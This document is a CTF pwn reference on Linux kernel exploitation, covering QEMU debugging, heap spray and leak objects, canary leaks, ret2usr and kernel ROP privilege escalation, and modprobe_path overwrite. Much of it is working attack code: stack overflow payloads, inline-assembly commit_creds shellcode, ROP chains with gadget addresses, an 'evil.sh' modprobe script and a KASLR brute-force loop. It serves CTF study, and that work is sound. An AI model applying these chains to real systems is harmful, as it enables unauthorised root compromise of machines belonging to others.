# CTF Pwn - Linux Kernel Exploitation

For tty_struct kROP (kernel Return-Oriented Programming), userfaultfd race stabilization, SLUB internals, cross-cache attacks, and DiceCTF 2026 kernel patterns, see [kernel-techniques.md](kernel-techniques.md).

For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).

---

## Environment Setup and Recon

**Key insight:** Before writing any exploit, check the QEMU launch script for enabled mitigations (`smep`, `smap`, `kpti`, `kaslr`) and the `oops=panic` flag. These determine which exploitation techniques are viable. Disable all mitigations for initial debugging, then re-enable them one by one.

### QEMU Debug Environment

Standard QEMU launch script for kernel challenge debugging:

```bash
qemu-system-x86_64 \
  -kernel ./bzImage \
  -initrd ./rootfs.cpio \
  -nographic \
  -monitor none \
  -cpu qemu64 \
  -append "console=ttyS0 nokaslr panic=1" \
  -no-reboot \
  -s \
  -m 256M
```

- `-s` enables GDB on port 1234 (`target remote :1234`)
- `-append "nokaslr"` disables KASLR for debugging
- Check QEMU script for: `smep`, `smap`, `kaslr`, `oops=panic`, `kpti=1`
- If `oops=panic` is absent, kernel oops only kills the faulting process (exploitable for info leaks via dmesg)

**Disable mitigations for initial debugging** by modifying the launch script:
```bash
-append "console=ttyS0 nokaslr nopti nosmep nosmap quiet panic=1"
-cpu kvm64   # instead of kvm64,+smep,+smap
```

### Extracting vmlinux

**Extract vmlinux from bzImage:**
```bash
# Use extract-vmlinux.sh from Linux kernel source (scripts/extract-vmlinux)
./extract-vmlinux ./bzImage > vmlinux

# Extract ROP gadgets
ROPgadget --binary ./vmlinux > gadgets.txt
```

### Kernel Config Checks

| Config | Effect | How to Check |
|--------|--------|-------------|
| SMEP/SMAP/KASLR/KPTI | CPU-level mitigations | Check QEMU run script `-cpu` and `-append` flags |
| FGKASLR | Per-function randomization | `readelf -S vmlinux` section count (see below) |
| `SLAB_FREELIST_RANDOM` | Randomized freelist order | Sequential allocations not adjacent |
| `SLAB_FREELIST_HARDEN` | XOR-obfuscated free pointers | Check freelist pointers in GDB |
| `STATIC_USERMODEHELPER` | Blocks `modprobe_path` overwrite | Disassemble `call_usermodehelper_setup` |
| `KALLSYMS_ALL` | `.data` symbols in `/proc/kallsyms` | `grep modprobe_path /proc/kallsyms` |
| `CONFIG_USERFAULTFD` | Enables userfaultfd syscall | Try calling it; disabled = -ENOSYS |
| eBPF (extended Berkeley Packet Filter) JIT | JIT-compiled BPF filters | `cat /proc/sys/net/core/bpf_jit_enable` (0=off, 1=on, 2=debug) |

Check oops behavior:
- `oops=panic` in QEMU `-append` -> oops causes full kernel panic
- Without it -> oops kills the faulting process only; dmesg may leak stack/heap/kbase pointers

### FGKASLR Detection

Fine-Grained KASLR randomizes each function independently. Detect by counting ELF sections:

```bash
readelf -S vmlinux | tail -5
# FGKASLR disabled: ~30 sections
# FGKASLR enabled:  36000+ sections (one per function)

file vmlinux
# FGKASLR enabled: "too many section (36140)"
```

---

## Kernel Objects: Spray, Leak, and Control Flow

Almost every kernel CTF exploit is built from a handful of familiar objects: one object is corrupted, another fills the freed slot, a third leaks an address, and a fourth gets its function pointer overwritten. This section is the catalogue - what each object is, which cache it lands in, how to allocate and free it from userspace, and what it gives you when you can read or write it.

**Choosing an object.** Four questions decide the answer:

1. **Cache size** - it has to land in the same `kmalloc-*` cache as the vulnerable object. If the target lives in a dedicated cache (`cred_jar`, `filp`, `skbuff_head_cache`, `seq_file_cache`), a kmalloc spray cannot reach it; you need a cross-cache step instead.
2. **GFP flag** - since 5.14 `GFP_KERNEL_ACCOUNT` objects are served by separate `kmalloc-cg-*` caches, so a cg spray cannot occupy a plain `GFP_KERNEL` slot or vice versa (see below).
3. **Lifetime** - freed inside the same syscall (`setxattr`, `poll_list`) vs. persistent until you close/release (`msg_msg`, `pipe_buffer`, `shm_file_data`, `simple_xattr`, `key`).
4. **Capability** - attacker-controlled content and length, readable back, contains kernel pointers (leak), contains a function pointer (control flow).

**Size classes.** x86-64 `kmalloc` caches are 8, 16, 32, 64, 96, 128, 192, 256, 512, 1024, 2048, 4096, 8192. SLAB's minimum object is 32 bytes, SLUB's is 8, so an 0x10-byte object is `kmalloc-16` only on SLUB. An allocation of `n` bytes lands in the smallest cache `>= n`, so the object header counts: `msg_msg` with a 0x20-byte payload still needs 0x30 + 0x20 bytes.

**`GFP_KERNEL` vs `GFP_KERNEL_ACCOUNT`.** Both historically came from the same `kmalloc-*` caches; `_ACCOUNT` only marks the object as user-data-related so it can be charged to a memcg. Memcg isolation came and went:

- before 5.9 (with `CONFIG_MEMCG_KMEM`): `_ACCOUNT` objects are taken from per-memcg caches, so the two flags are isolated;
- 5.9-5.14 (`10befea91b61`, "mm: memcg/slab: use a single set of kmem_caches for all accounted allocations"): isolation removed, both flags share `kmalloc-*`;
- 5.14+ (`494c1dfe855e`, "mm: memcontrol: slab: fix potential obj stock corruption"): isolation is back, `_ACCOUNT` objects now live in a separate `kmalloc-cg-*` family.

Practical consequence: on a 6.x kernel, spraying with `msg_msg` / `pipe_buffer` / `seq_operations` (all `_ACCOUNT`) cannot reclaim a vulnerable object allocated with plain `GFP_KERNEL`. In that case use `setxattr`, `user_key_payload`, `shm_file_data`, `ldt_struct`, `timerfd_ctx` or `simple_xattr`, or spend one cross-cache step to move the page.

**Finding sizes and offsets in the target's kernel:**

```bash
pahole -C tty_struct vmlinux          # members + offsets for this exact build
pahole -C pipe_buffer vmlinux
pahole --sizes vmlinux | sort -k2 -n | head -50   # what fits a given cache
```

### Selection table

| Need | Object | Size / cache | GFP | Allocate -> free |
|---|---|---|---|---|
| arbitrary-size spray, controlled bytes | `msg_msg` / `msg_msgseg` | 0x30 + len, any cache | ACCOUNT | `msgsnd()` -> `msgrcv()` |
| arbitrary-size spray, no header | `sk_buff` data | ~0x140 + len | (verify per kernel) | `socketpair()` + `send()` -> `recv()` |
| arbitrary-size spray, temporary | `setxattr` buffer | len, any cache | KERNEL | one `setxattr()` call |
| arbitrary-size spray, persistent | `simple_xattr` (tmpfs) | 0x20 + len | KERNEL | `setxattr()` -> `removexattr()` |
| arbitrary-size spray, read back | `user_key_payload` | 0x18 + len | KERNEL | `add_key()` -> `keyctl_revoke()` |
| text leak | `tty_struct` | 0x2b8 -> kmalloc-1024 | ACCOUNT | `open("/dev/ptmx")` -> `close()` |
| text leak | `seq_operations` | 0x20 -> kmalloc-32 | ACCOUNT | `open("/proc/self/stat")` -> `close()` |
| text + vmemmap leak | `pipe_buffer` | 0x28 x ring size | ACCOUNT | `pipe()` -> `close()` |
| heap leak | `tty_file_private` | 0x20 -> kmalloc-32 | KERNEL | `open("/dev/ptmx")` |
| heap leak | `shm_file_data` | 0x20 -> kmalloc-32 | KERNEL | `shmget()`/`shmat()` -> `shmdt()` |
| text leak | `timerfd_ctx` | ~0xa0 -> kmalloc-192/256 | KERNEL | `timerfd_create()` -> `close()` |
| control flow | `tty_struct.ops` | kmalloc-1024 | ACCOUNT | `ioctl()` / `write()` |
| control flow | `seq_operations.start` | kmalloc-32 | ACCOUNT | `read()` on the stat fd |
| control flow | `pipe_buffer.ops` | see above | ACCOUNT | pipe read/write/release |
| control flow | `sk_buff.destructor` | head cache + data | - | `kfree_skb()` |
| control flow | `timerfd_ctx` hrtimer | kmalloc-192/256 | KERNEL | timer expiry |
| control flow | `subprocess_info` | 0x60 -> kmalloc-96/128 | KERNEL | kernel-triggered usermodehelper |
| arbitrary read/write | `ldt_struct.entries` | 0x10 -> kmalloc-16 | KERNEL | `modify_ldt()` |
| ROP staging | `pt_regs` | 0xa8, kernel stack bottom | - | every syscall entry |

### tty_struct (kmalloc-1024, `GFP_KERNEL_ACCOUNT`)

`open("/dev/ptmx")` -> `alloc_tty_struct()` -> `kzalloc(sizeof(struct tty_struct), GFP_KERNEL_ACCOUNT)`; `close()` frees it. Size is 0x2b8 on 5.x, so it lives in kmalloc-1024.

```c
struct tty_struct {
    int magic;                        // +0x00: 0x5401, checked by tty_ioctl()
    struct kref kref;                 // +0x04
    struct device *dev;               // +0x08: class device, NULL for ptys
    struct tty_driver *driver;        // +0x10: must stay a valid pointer
    const struct tty_operations *ops; // +0x18: -> ptm_unix98_ops / pty_unix98_ops
    // ...
};
```

- **Text leak:** `ops` is initialised to the global `ptm_unix98_ops` (master, i.e. `/dev/ptmx`) or `pty_unix98_ops` (slave, `/dev/pts/N`). KASLR keeps page granularity, so the low three hex digits identify which of the two you leaked.
- **Heap/direct-map leak:** `driver` points into a `tty_driver` allocated by `tty_alloc_driver()`, so it is a direct-map address; `dev` is set for real devices and may be NULL for ptys. There is no reliable route from here to `page_offset_base`.
- **Magic:** `0x5401` at +0x00 is also how you *find* a sprayed `tty_struct` when you only have an arbitrary read (grep for the magic).
- **Control flow:** overwrite `ops` with a fake `tty_operations` inside the same object, then `ioctl()`/`write()` reaches `tty->ops->ioctl(tty, cmd, arg)`. `driver` must remain a plausible pointer or the kernel oopses before the call.

### tty_file_private (kmalloc-32)

Allocated next to every tty fd by `tty_alloc_file()`.

```c
struct tty_file_private {
    struct tty_struct *tty;   // +0x00: kmalloc-1024 address -> heap leak
    struct file *file;        // +0x08
    struct list_head list;    // +0x10
};
```

### seq_operations (kmalloc-32, `GFP_KERNEL_ACCOUNT`)

`open("/proc/self/stat")` -> `stat_open()` -> `single_open_size()` -> `single_open()`, which does `kmalloc(sizeof(struct seq_operations), GFP_KERNEL_ACCOUNT)` and fills four pointers (`single_start`, `single_next`, `single_stop`, and the file's `show`). `close()` -> `single_release()` frees it.

```c
struct seq_operations {
    void *(*start)(struct seq_file *m, loff_t *pos);   // +0x00
    void  (*stop)(struct seq_file *m, void *v);        // +0x08
    void *(*next)(struct seq_file *m, void *v, loff_t *pos); // +0x10
    int   (*show)(struct seq_file *m, void *v);        // +0x18
};
```

- **Text leak:** all four are kernel `.text` pointers.
- **Control flow:** `read()` -> `seq_read_iter()` -> `m->op->start(m, &m->index)`; overwrite `start` and read the fd.
- `struct seq_file` itself comes from the dedicated `seq_file_cache`, so it is not sprayable from kmalloc - only its `op` is.

### msg_msg / msg_msgseg (any cache, `GFP_KERNEL_ACCOUNT`)

The System V message queue allocates the message header and payload in one chunk. This is the most flexible spray on modern kernels: any size, controlled bytes, and a list node you can abuse for leaks.

```c
struct msg_msg {
    struct list_head m_list;   // +0x00: next/prev in the queue
    long m_type;               // +0x10
    size_t m_ts;               // +0x18: message size, copied out by msgrcv
    struct msg_msgseg *next;   // +0x20: pointer to the first extra segment
    void *security;            // +0x28: LSM blob (may be NULL without SELinux)
};
```

- **Allocation:** `msgget()` then `msgsnd(qid, &{mtype, text}, len, 0)`. First chunk is `0x30 + min(len, 0xfd0)`; anything beyond `DATALEN_MSG = PAGE_SIZE - 0x30 = 0xfd0` goes into `msg_msgseg` chunks of `0x8 (next) + up to 0xff8` data.
- **Free:** `msgrcv()` with the real type, or `IPC_RMID`.
- **OOB read / arbitrary read:** corrupt `m_ts` to a huge value and read with `msgrcv(..., MSG_COPY | IPC_NOWAIT, msgtyp_idx, ...)` - `MSG_COPY` copies the `msgtyp_idx`-th message without dequeuing, so you get `m_ts` bytes of memory past the payload. Requires `CONFIG_CHECKPOINT_RESTORE`. Pointing `next` at `target - 0x8` turns the segment walk into an arbitrary read at `target`.
- **Arbitrary free:** overwrite `next` and let `free_msg()` walk into an attacker-chosen address.
- **Leak:** `m_list.next/prev` are heap addresses; after a free the list pointers hold a direct-map address (`msg_msg` is a slab object), i.e. a heap leak rather than a text leak.
- Sizes are exact, so `msg_msg` also serves as the "same cache, different object" for almost any target - the classic CVE-2021-22555 style chain uses it for both the OOB read and the write.

### pipe_buffer / pipe_inode_info (kmalloc-1k and up, `GFP_KERNEL_ACCOUNT`)

`pipe()` allocates a `pipe_inode_info` plus an array of `pipe_buffer`:

```c
struct pipe_buffer {
    struct page *page;                       // +0x00: vmemmap pointer
    unsigned int offset;                     // +0x08
    unsigned int len;                        // +0x0c
    const struct pipe_buf_operations *ops;   // +0x10: kernel .data/.text
    unsigned int flags;                      // +0x18
    unsigned long private;                   // +0x20
};                                           // 0x28
```

- Default ring is 16 buffers -> `kcalloc(16, 0x28)` = 0x280 -> kmalloc-1024; `fcntl(F_SETPIPE_SZ)` changes the ring size and therefore the cache (32 buffers -> 0x500 -> kmalloc-2048, and so on). This makes `pipe_buffer` the most convenient **size-adjustable** spray, and the usual choice when the vulnerable object sits in kmalloc-1k or larger.
- **Leaks:** `page` is a `struct page *` in the vmemmap - with the standard `page_offset_base = 0xffff888000000000` layout it also pins down the direct map; `ops` is `&anon_pipe_buf_ops` in kernel `.data`.
- **Control flow:** `ops` is called on read/write/release (`ops->confirm`, `ops->release`, `ops->try_steal`). Overwrite it with a fake ops table whose `release`/`confirm` points at a stack pivot.
- **Flags:** `PIPE_BUF_FLAG_CAN_MERGE` (0x10) in `flags` is the Dirty Pipe primitive (CVE-2022-0847): set it on a page-cache-backed buffer and the next `write()` merges into the file page.
- `pipe_inode_info` itself is a separate `kzalloc` (kmalloc-192/256 depending on version) and holds `head`, `tail`, `ring_size`, `tmp_page` plus the reader/writer wait queues.

### sk_buff data (kmalloc-*, contiguous bytes)

`struct sk_buff` comes from `skbuff_head_cache`, but its data area (`skb->head`) is a plain `kmalloc` allocation whose size is attacker-influenced. `socketpair(AF_UNIX, SOCK_DGRAM, 0)` + `send()`/`recv()` is the standard spray. The allocation is `SKB_DATA_ALIGN(payload) + SKB_DATA_ALIGN(sizeof(struct skb_shared_info))`, and `skb_shared_info` (~0x140 on x86-64 with 17 frags) sits at the *tail* of the chunk, so to fill a cache of size N send roughly `N - 0x140` bytes.

- **Spray:** fully attacker-controlled bytes, size adjustable per packet, one skb per `send()` (cheap to loop).
- **Leaks:** with an OOB read, `skb_shared_info` and the `skb_shared_info.destructor_arg`/frag pointers carry heap and page addresses.
- **Control flow:** `skb->destructor` is called from `kfree_skb()`; overwrite it and trigger a receive/close.

### user_key_payload (any cache, `GFP_KERNEL`)

`add_key("user", desc, payload, plen, KEY_SPEC_PROCESS_KEYRING)`:

```c
struct user_key_payload {
    struct callback_head rcu;   // +0x00: {next, func}
    unsigned short datalen;     // +0x10
    char data[];                // +0x18: attacker bytes
};
```

- Payload limit 32767 bytes, so it covers every cache up to kmalloc-32k.
- **Read back:** `keyctl(KEYCTL_READ, key, buf, buflen)` copies `data[]` out, which makes it a leak/verification primitive rather than a blind spray.
- The first 0x10 bytes are an `rcu_head` that stays untouched until the key is revoked - after a UAF reclaim you can leak the old contents.
- **Free is delayed:** `keyctl_revoke()`/`KEYCTL_UNLINK` schedules RCU cleanup, so the slot comes back later than you expect (often used as a "spray now, free later" trick).
- The `struct key` itself lives in `key_jar`, not in kmalloc.

### setxattr buffer and simple_xattr (`GFP_KERNEL`)

Two different objects, same syscall:

- `setxattr(path, name, value, size, flags)` does `kvalue = kvmalloc(size, GFP_KERNEL)` + `copy_from_user`, then `kvfree` before returning. Any size, any contents, but the chunk is gone as soon as the call returns.
- **Hanging it open:** map two pages, register `userfaultfd` on the second, put the payload at the end of the first, and pass a length that crosses the page boundary. The fault blocks `copy_from_user` with the allocation still live - a controlled, persistent spray (SECCON 2020 kstack). Since 5.11 unprivileged `userfaultfd` is restricted; FUSE is the alternative.
- On tmpfs the same call stores the value in a `simple_xattr` (`struct list_head list; char *name; size_t size; char value[];`, `0x20 + len`) that **persists** until `removexattr()` - a persistent `GFP_KERNEL` spray that needs no fault trick.

### poll_list (kmalloc-32..1024)

`poll()` builds a linked list of `struct poll_list` chunks:

```c
struct poll_list {
    struct poll_list *next;   // +0x00
    int len;                  // +0x08
    struct pollfd entries[];  // +0x0c: attacker-controlled fd/events/revents
};
```

Allocated at entry and freed before `poll()` returns; the entry array contents are user-controlled, and corrupting `next` turns the teardown into a free of an arbitrary address.

### subprocess_info (kmalloc-96/128)

`call_usermodehelper_setup()` does `kzalloc(sizeof(struct subprocess_info), GFP_KERNEL)` - 0x60 bytes on 5.x, which rounds to kmalloc-96 (older notes say kmalloc-128; confirm with `pahole`) and fills a `work_struct` plus `path`/`argv`/`envp`/`init`/`cleanup` pointers. The work function runs on `system_wq`; overwriting `work.func` (or `init`) hijacks a thread that already runs as root. Practical use is limited to targets that trigger a usermodehelper (`modprobe_path`, `core_pattern`).

### timerfd_ctx (kmalloc-192/256)

`timerfd_create()` -> `kzalloc(sizeof(struct timerfd_ctx), GFP_KERNEL)` - roughly 0xa0 bytes on 5.x, so the cache depends on the version; check with `pahole`. The context embeds an `hrtimer`, whose `function` field is a kernel `.text` pointer (leak) and whose expiry calls it (control flow). `read()` on the timerfd also touches the context, so a UAF reclaim here gives both a leak and a delayed trigger.

### shm_file_data (kmalloc-32, `GFP_KERNEL`)

`shmget(IPC_PRIVATE, ...)` -> `newseg()` -> `kzalloc(sizeof(struct shm_file_data), GFP_KERNEL)`; `shmat()` attaches it and `shmdt()` drops it.

```c
struct shm_file_data {
    int id;                                    // +0x00
    struct ipc_namespace *ns;                  // +0x08
    struct file *file;                         // +0x10: heap pointer
    const struct vm_operations_struct *vm_ops; // +0x18: kernel .data pointer
};
```

Small, persistent, and full of kernel pointers - a natural `kmalloc-32` leak object that many players forget in favour of `seq_operations` (which is `_ACCOUNT`).

### ldt_struct and modify_ldt (arbitrary read/write)

`modify_ldt(1, &desc, sizeof(desc))` -> `write_ldt()` -> `alloc_ldt_struct()` -> `kmalloc(sizeof(struct ldt_struct), GFP_KERNEL)`:

```c
struct ldt_struct {
    struct desc_struct *entries;  // +0x00: copied to/from userspace
    unsigned int nr_entries;      // +0x08
    int slot;                     // +0x0c
};                                // 0x10 -> kmalloc-16 (SLUB) / kmalloc-32 (SLAB)
```

- **Arbitrary read:** `modify_ldt(0, user_buf, 8)` -> `read_ldt()` -> `copy_to_user(user_buf, ldt->entries, nr_entries * 8)`. Point `entries` at a kernel address and read 8 bytes at a time.
- **Brute-forcing under KASLR:** `copy_to_user()` from an unmapped kernel address returns an error instead of panicking, so bump `entries` by 0x1000000 until the call succeeds -> the first hit is (at or just past) `page_offset_base`. Then read `page_offset_base + 0x9d000`, where `secondary_startup_64` is stored (value `0xffffffff81000060` on the 5.x kernels this works on), and derive the `.text` base.
- **hardened usercopy:** copying straight out of kernel `.text` trips the check and panics. `fork()` calls `ldt_dup_context()` -> `memcpy(new_ldt->entries, old_ldt->entries, nr * 8)` entirely inside the kernel, so the child can `read_ldt()` the copy without the check - do the search in the child.
- **Arbitrary write:** `write_ldt()` does `memcpy(new_ldt->entries, old_ldt->entries, old_nr_entries * 8)`; win the race between `alloc_ldt_struct()` and that `memcpy` by rewriting `old_ldt->entries` to the target. The window is short, which is why this half is rarely used in practice.

```c
/* read 8 bytes from an arbitrary kernel address through modify_ldt */
struct user_desc desc = { .entry_number = 0x8000 / 8, .base_addr = 0xff0000 };
syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));   /* allocate ldt_struct */

/* ... UAF-reclaim the 0x10 chunk and set entries to TARGET, nr_entries = 1 ... */

uint64_t out;
if (syscall(SYS_modify_ldt, 0, &out, 8) > 0)       /* copy_to_user(TARGET) */
    printf("leak: %llx\n", out);
```

### pt_regs and the kernel stack (ROP staging)

`pt_regs` is not a heap object: `entry_SYSCALL_64` pushes all registers onto the kernel stack (`PUSH_AND_CLEAR_REGS`), so the 0xa8-byte frame sits at the stack base - the highest addresses of the 16 KB (THREAD_SIZE) stack, since the stack grows down.

```c
struct pt_regs {
    unsigned long r15, r14, r13, r12, rbp, rbx, r11, r10, r9, r8;
    unsigned long rax, rcx, rdx, rsi, rdi, orig_rax;
    unsigned long rip, cs, eflags, rsp, ss;   // iretq frame, 0xa8 total
};
```

- When a hijacked callback (e.g. `seq_operations->start`) runs inside a syscall, `rsp` is a fixed distance below that base, so `r8`-`r15` - all attacker-controlled at syscall entry - are still on the stack above you. Find an `add rsp, X; ret` gadget whose `X` lands on `r15`, and the registers become a ROP chain.
- Debug tip: before the `syscall`, set `r15..r8` to distinct markers (`0xbeefdead`, `0x11111111`, ...) and dump the stack; the offset between `rsp` at the callback and the markers is your `X`.
- **5.18 and later:** `CONFIG_RANDOMIZE_KSTACK_OFFSET` (default y) adds a random offset to the syscall stack (`eea2647e74cd`), so the distance is no longer fixed and this technique is effectively dead unless the challenge disables the option (some CTF kernels do).

### Objects you cannot kmalloc-spray

- `cred` - from the dedicated `cred_jar`; reach it with an arbitrary write and patch `uid`/`gid`/`euid`/`egid` in place (or swap the whole pointer) rather than trying to reclaim a slot.
- `struct file` - `filp` cache; `f_op` hijack needs an arbitrary write, not a spray.
- `struct key` - `key_jar` (the *payload* is kmalloc'd, the key is not).
- `seq_file` - `seq_file_cache`; only the `seq_operations` next to it is sprayable.

### Putting them together

- **Leak -> write -> trigger**: `seq_operations` (32, cg) for text, `tty_struct` (1k, cg) for text+heap, `shm_file_data` (32, KERNEL) or `tty_file_private` for heap; then overwrite `modprobe_path` (arbitrary write) or a vtable (`tty->ops`, `pipe_buffer->ops`, `seq_operations->start`) and call into it.
- **Cross-cache**: when the vulnerable object is in a dedicated cache, free a whole slab page (drain the cache, or use `msg_msg`/`pipe_buffer` to reclaim a page returned to the buddy allocator - see the DiceCTF 2026 CPU-split technique in [kernel-techniques.md](kernel-techniques.md)).
- **GFP mismatch is the most common self-inflicted failure**: a `GFP_KERNEL` target and a `msg_msg` spray on 6.x will never share a slot. Check the allocation flag in the module source (or `pahole`/`crash` on the running kernel) before choosing the spray.

---

## Kernel Stack Overflow and Canary Leak

Kernel modules with vulnerable read/write handlers often allow stack buffer overflow. The exploitation pattern mirrors userland stack overflows but with kernel-specific register state management.

**Canary leak via oversized read (hxp CTF 2020):**

A vulnerable `hackme_read()` copies from a 32-element stack array `tmp[32]` but allows reading up to 0x1000 bytes -- leaking the stack canary and kernel text pointers beyond the buffer.

```c
unsigned long leak[40];
int fd = open("/dev/hackme", O_RDWR);

// Read beyond stack buffer to leak canary + kernel pointers
read(fd, leak, sizeof(leak));

// Stack layout: tmp[32] at rbp-0x98, canary at rbp-0x18
// Canary at index 16 (offset 0x80 from buffer start)
unsigned long cookie = leak[16];

// Kernel text pointer at index 38 -> compute KASLR base
unsigned long kernel_base = (leak[38] & 0xffffffffffff0000);
long kaslr_offset = kernel_base - 0xffffffff81000000;
```

**Stack overflow payload structure:**

```c
unsigned long payload[50];
int off = 16;                    // offset to canary position
payload[off++] = cookie;         // canary
payload[off++] = 0x0;            // padding (rbx)
payload[off++] = 0x0;            // padding (r12)
payload[off++] = 0x0;            // saved rbp
payload[off++] = rop_start;      // return address -> ROP chain
// ... ROP chain follows ...
write(fd, payload, sizeof(payload));
```

**ioctl-based size check bypass (K3RN3LCTF 2021):**

Some modules gate write length against a global `MaxBuffer` variable that is itself controllable via `ioctl()`:

```c
// Vulnerable pattern in module:
// swrite() checks: if (MaxBuffer < user_size) return -EFAULT;
// sioctl() with cmd 0x20: MaxBuffer = (int)arg;  <- attacker-controlled

// Exploit: increase MaxBuffer before overflow
int fd = open("/proc/pwn_device", O_RDWR);
ioctl(fd, 0x20, 300);            // set MaxBuffer to 300 (buffer is only 128)
write(fd, overflow_payload, 300); // now passes size check -> stack overflow
```

**Key insight:** Kernel stack canaries work identically to userland canaries. A vulnerable read handler that copies more bytes than the buffer size leaks the canary and saved registers, including kernel text pointers for KASLR bypass. Look for `ioctl` handlers that modify global variables used in bounds checks -- they often bypass write size restrictions.

---

## Privilege Escalation Primitives

### ret2usr (No SMEP/SMAP)

When SMEP and SMAP are disabled, the kernel can directly execute userland code and access userland memory. Hijack RIP to a userland function that calls `prepare_kernel_cred(0)` and `commit_creds()`.

```c
// Addresses from /proc/kallsyms (or leak)
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds       = 0xffffffff814c6410;

// Saved userland state for iretq return
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"        // prepare_kernel_cred(NULL) -> init cred
        "call rax;"
        "mov rdi, rax;"        // commit_creds(new_cred)
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"              // restore GS base for userland
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"               // return to userland as root
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

After `privesc()` returns to userland, the process has root credentials. Call `system("/bin/sh")` to get a root shell.

### Kernel ROP with prepare_kernel_cred / commit_creds

When SMEP is enabled, build a kernel ROP chain to call `prepare_kernel_cred(0)` -> pass result to `commit_creds()` -> return to userland.

```c
// Find gadgets: ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax" ./vmlinux
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long mov_rdi_rax_pop1_ret = 0xffffffff816bf740; // mov rdi, rax; ...; pop rbx; ret
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;      // swapgs; pop rbp; ret
unsigned long iretq = 0xffffffff8100c0d9;

unsigned long payload[50];
int off = 16;   // canary offset
payload[off++] = cookie;
payload[off++] = 0;           // rbx
payload[off++] = 0;           // r12
payload[off++] = 0;           // rbp

// ROP chain: prepare_kernel_cred(0) -> commit_creds(result)
payload[off++] = pop_rdi_ret;
payload[off++] = 0x0;                      // rdi = NULL
payload[off++] = prepare_kernel_cred;
payload[off++] = mov_rdi_rax_pop1_ret;     // rdi = rax (new cred)
payload[off++] = 0x0;                      // pop rbx padding
payload[off++] = commit_creds;

// Return to userland
payload[off++] = swapgs_pop1_ret;
payload[off++] = 0x0;                      // pop rbp padding
payload[off++] = iretq;
payload[off++] = user_rip;                 // spawn_shell
payload[off++] = user_cs;                  // 0x33
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;                  // 0x2b
```

**Critical gadget: `mov rdi, rax`** -- needed to pass the return value of `prepare_kernel_cred()` (in RAX) to `commit_creds()` (expects argument in RDI). Search for variants like `mov rdi, rax; ... ; ret` that may clobber other registers.

**Tool:** `ropr` is faster than ROPgadget for large kernel images:
```bash
ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax|^swapgs|^iretq" ./vmlinux
```

### Saving and Restoring Userland State

Before triggering the kernel exploit, save userland register state for the `iretq` return:

```c
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;  // function to call after return
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}
```

**Register values (x86_64 userland):**
- `CS` = 0x33 (64-bit user code segment)
- `SS` = 0x2b (64-bit user stack segment)
- `RSP` = current userland stack pointer
- `RFLAGS` = current flags register
- `RIP` = address of post-exploit function (e.g., `spawn_shell`)

---

## modprobe_path Overwrite

### Technique Overview

Overwrite the global `modprobe_path` variable (default: `"/sbin/modprobe"`) with a path to an attacker-controlled script. When the kernel encounters a binary with an unknown format, it executes `modprobe_path` as root.

**Requirements:**
1. Arbitrary Address Write (AAW) to overwrite `modprobe_path`
2. Ability to create two files: a malformed binary and an evil script
3. `CONFIG_STATIC_USERMODEHELPER` is disabled

**Steps:**

```bash
# 1. Write evil script
echo '#!/bin/sh' > /tmp/evil.sh
echo 'cat /flag > /tmp/output' >> /tmp/evil.sh
echo 'chmod 777 /tmp/output' >> /tmp/evil.sh
chmod +x /tmp/evil.sh

# 2. Overwrite modprobe_path with "/tmp/evil.sh" using your AAW primitive

# 3. Create and execute a malformed binary (non-printable first 4 bytes)
echo -ne '\xff\xff\xff\xff' > /tmp/trigger
chmod +x /tmp/trigger
/tmp/trigger

# 4. Read the flag
cat /tmp/output
```

**How it works:** `execve()` -> `search_binary_handler()` -> no format matches -> `request_module("binfmt-XXXX")` -> `call_modprobe()` -> executes `modprobe_path` as root.

**Key insight:** The first 4 bytes of the trigger binary must be non-printable (not ASCII without tab/newline). If they are printable, the kernel skips the `request_module()` call.

### Bruteforce Without Leak

`modprobe_path` has only 1 byte of entropy under KASLR (the randomized page offset). With AAW, brute-force the address:

```python
# modprobe_path base address (from debugging without KASLR)
MODPROBE_BASE = 0xffffffff8265ff00
# Under KASLR, only the 0x65 byte varies
# Try 256 offsets
for byte_guess in range(256):
    addr = (MODPROBE_BASE & ~0xFF0000) | (byte_guess << 16)
    write_string(addr, "/tmp/evil.sh")
    trigger_modprobe()
```

### Checking CONFIG_STATIC_USERMODEHELPER

If enabled, `call_usermodehelper_setup()` ignores `modprobe_path` and uses a hardcoded constant.

**Detection via disassembly:**

```bash
# 1. Get function address
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. Set GDB breakpoint and trigger
echo -ne '\xff\xff\xff\xff' > /tmp/nirugiri && chmod +x /tmp/nirugiri && /tmp/nirugiri

# 3. In GDB, disassemble and check:
# NOT set: rdi saved into r14 at +9, used at +127 -> modprobe_path passed through
# SET: immediate constant at +122 instead of r14 -> 1st arg (modprobe_path) ignored
```

